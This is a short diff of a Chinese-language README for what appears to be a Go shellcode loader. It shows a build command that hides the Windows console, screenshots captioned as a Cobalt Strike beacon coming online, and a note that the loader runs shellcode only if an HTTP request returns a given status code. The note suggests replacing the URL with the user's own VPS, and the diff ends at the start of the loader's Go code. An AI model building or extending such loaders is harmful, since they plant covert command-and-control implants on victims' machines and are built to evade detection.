@@ -41,8 +41,8 @@ go build -trimpath -ldflags="-w -s -H=windowsgui" -o main.exe main.go
 ![image](https://user-images.githubusercontent.com/73928418/124045359-0fa37780-da42-11eb-81f2-36e89ba41469.png)
 CobaltStrike上线
 ![image](https://user-images.githubusercontent.com/73928418/124045379-1d58fd00-da42-11eb-8754-ee31d52a05d0.png)
-**PS**
-这里采用的是根据网页状态码判断是否执行shellcode，当然这里的url也可以换成自己的VPS网址
+**PS：**
+1. 这里采用的是根据网页状态码判断是否执行shellcode，当然这里的url也可以换成自己的VPS网址
 ```go
 func main() {
 	resp, _ := http.Get("http://www.baidu.com")
